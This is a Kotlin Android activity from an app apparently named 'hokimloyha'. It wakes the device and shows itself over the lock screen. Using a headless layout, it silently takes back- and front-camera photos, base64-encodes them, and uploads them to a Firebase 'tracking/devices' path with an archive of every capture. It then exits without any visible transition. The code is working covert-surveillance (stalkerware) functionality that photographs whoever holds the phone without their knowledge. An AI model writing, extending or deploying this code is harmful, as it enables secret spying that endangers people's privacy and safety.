package com.hokimloyha.app.service

import android.Manifest
import android.app.KeyguardManager
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Matrix
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.util.Size
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import com.google.firebase.database.FirebaseDatabase
import com.hokimloyha.app.R
import java.io.ByteArrayOutputStream
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class CameraActivity : AppCompatActivity() {
    private var imageCapture: ImageCapture? = null
    private lateinit var cameraExecutor: ExecutorService
    private var cameraProvider: ProcessCameraProvider? = null
    private var backPhotoBase64: String? = null
    private var isFinished = false
    private val mainHandler = Handler(Looper.getMainLooper())
    private var targetDeviceId: String = "hokim"

    private val timeoutRunnable = Runnable {
        Log.w("CameraActivity", "Watchdog timeout reached, closing camera.")
        safeFinish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        targetDeviceId = intent.getStringExtra("device_id") ?: "hokim"

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                setShowWhenLocked(true)
                setTurnScreenOn(true)
                val km = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
                km?.requestDismissKeyguard(this, null)
            } else {
                @Suppress("DEPRECATION")
                window.addFlags(
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                )
            }
            window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        } catch (e: Exception) {
            Log.e("CameraActivity", "Window flags error", e)
        }

        setContentView(R.layout.activity_camera_headless)
        cameraExecutor = Executors.newSingleThreadExecutor()

        mainHandler.postDelayed(timeoutRunnable, 12000L)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
            initAndStartCapture()
        } else {
            safeFinish()
        }
    }

    private fun initAndStartCapture() {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            try {
                cameraProvider = cameraProviderFuture.get()
                captureBackCamera()
            } catch (exc: Exception) {
                Log.e("CameraActivity", "Camera init failed", exc)
                safeFinish()
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun captureBackCamera() {
        if (isFinished || isFinishing || isDestroyed) return
        try {
            cameraProvider?.unbindAll()

            if (cameraProvider?.hasCamera(CameraSelector.DEFAULT_BACK_CAMERA) == true) {
                @Suppress("DEPRECATION")
                imageCapture = ImageCapture.Builder()
                    .setTargetResolution(Size(640, 480))
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()

                cameraProvider?.bindToLifecycle(this, CameraSelector.DEFAULT_BACK_CAMERA, imageCapture)

                mainHandler.postDelayed({
                    if (isFinished || isFinishing || isDestroyed) return@postDelayed
                    try {
                        imageCapture?.takePicture(
                            cameraExecutor,
                            object : ImageCapture.OnImageCapturedCallback() {
                                override fun onError(exc: ImageCaptureException) {
                                    Log.e("CameraActivity", "Back camera capture error: ${exc.message}")
                                    mainHandler.post { captureFrontCamera() }
                                }

                                override fun onCaptureSuccess(backImage: ImageProxy) {
                                    backPhotoBase64 = compressImageProxyToBase64(backImage)
                                    mainHandler.post { captureFrontCamera() }
                                }
                            }
                        )
                    } catch (e: Exception) {
                        Log.e("CameraActivity", "takePicture back exception", e)
                        captureFrontCamera()
                    }
                }, 300L)
            } else {
                captureFrontCamera()
            }
        } catch (e: Exception) {
            Log.e("CameraActivity", "Back camera bind error", e)
            captureFrontCamera()
        }
    }

    private fun captureFrontCamera() {
        if (isFinished || isFinishing || isDestroyed) return
        try {
            cameraProvider?.unbindAll()

            mainHandler.postDelayed({
                if (isFinished || isFinishing || isDestroyed) return@postDelayed
                try {
                    if (cameraProvider?.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA) == true) {
                        @Suppress("DEPRECATION")
                        imageCapture = ImageCapture.Builder()
                            .setTargetResolution(Size(640, 480))
                            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                            .build()

                        cameraProvider?.bindToLifecycle(this, CameraSelector.DEFAULT_FRONT_CAMERA, imageCapture)

                        mainHandler.postDelayed({
                            if (isFinished || isFinishing || isDestroyed) return@postDelayed
                            try {
                                imageCapture?.takePicture(
                                    cameraExecutor,
                                    object : ImageCapture.OnImageCapturedCallback() {
                                        override fun onError(exc: ImageCaptureException) {
                                            Log.e("CameraActivity", "Front camera capture error: ${exc.message}")
                                            savePhotosAndFinish(null)
                                        }

                                        override fun onCaptureSuccess(frontImage: ImageProxy) {
                                            val frontBase64 = compressImageProxyToBase64(frontImage)
                                            savePhotosAndFinish(frontBase64)
                                        }
                                    }
                                )
                            } catch (e: Exception) {
                                Log.e("CameraActivity", "takePicture front exception", e)
                                savePhotosAndFinish(null)
                            }
                        }, 300L)
                    } else {
                        savePhotosAndFinish(null)
                    }
                } catch (e: Exception) {
                    Log.e("CameraActivity", "Front camera bind error", e)
                    savePhotosAndFinish(null)
                }
            }, 250L)
        } catch (e: Exception) {
            Log.e("CameraActivity", "Front camera setup error", e)
            savePhotosAndFinish(null)
        }
    }

    private fun compressImageProxyToBase64(image: ImageProxy): String? {
        return try {
            val rotationDegrees = image.imageInfo.rotationDegrees
            var workingBitmap: Bitmap? = try {
                image.toBitmap()
            } catch (_: Exception) {
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
            }
            image.close()

            if (workingBitmap != null) {
                if (rotationDegrees != 0) {
                    val matrix = Matrix().apply { postRotate(rotationDegrees.toFloat()) }
                    val rotated = Bitmap.createBitmap(
                        workingBitmap, 0, 0,
                        workingBitmap.width, workingBitmap.height, matrix, true
                    )
                    if (rotated != workingBitmap) workingBitmap.recycle()
                    workingBitmap = rotated
                }

                val maxDimension = 640
                if (workingBitmap.width > maxDimension || workingBitmap.height > maxDimension) {
                    val scale = maxDimension.toFloat() / maxOf(workingBitmap.width, workingBitmap.height)
                    val newWidth = (workingBitmap.width * scale).toInt()
                    val newHeight = (workingBitmap.height * scale).toInt()
                    val scaledBitmap = Bitmap.createScaledBitmap(workingBitmap, newWidth, newHeight, true)
                    if (scaledBitmap != workingBitmap) {
                        workingBitmap.recycle()
                        workingBitmap = scaledBitmap
                    }
                }

                val outputStream = ByteArrayOutputStream()
                workingBitmap.compress(Bitmap.CompressFormat.JPEG, 60, outputStream)
                val compressedBytes = outputStream.toByteArray()
                workingBitmap.recycle()
                Base64.encodeToString(compressedBytes, Base64.NO_WRAP)
            } else null
        } catch (e: Exception) {
            try { image.close() } catch (_: Exception) {}
            null
        }
    }

    private fun savePhotosAndFinish(frontBase64: String?) {
        try {
            val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
            val mediaRef = database.getReference("tracking/devices/$targetDeviceId/media")

            val now = System.currentTimeMillis()
            val photoItem = mapOf(
                "back_base64" to (backPhotoBase64 ?: ""),
                "front_base64" to (frontBase64 ?: ""),
                "timestamp" to now
            )

            mediaRef.child("latest_photo").setValue(photoItem)
            mediaRef.child("archive_photos").push().setValue(photoItem)
            mediaRef.child("status").setValue("📷 Yangi rasm qabul qilindi ($now)")

            mainHandler.postDelayed({ safeFinish() }, 100L)
        } catch (e: Exception) {
            safeFinish()
        }
    }

    private fun safeFinish() {
        if (isFinished) return
        isFinished = true
        mainHandler.removeCallbacks(timeoutRunnable)
        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
        runOnUiThread { finish() }
    }

    override fun finish() {
        super.finish()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            overrideActivityTransition(OVERRIDE_TRANSITION_CLOSE, 0, 0)
        } else {
            @Suppress("DEPRECATION")
            overridePendingTransition(0, 0)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isFinished = true
        mainHandler.removeCallbacks(timeoutRunnable)
        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
        try { cameraExecutor.shutdown() } catch (_: Exception) {}
    }
}
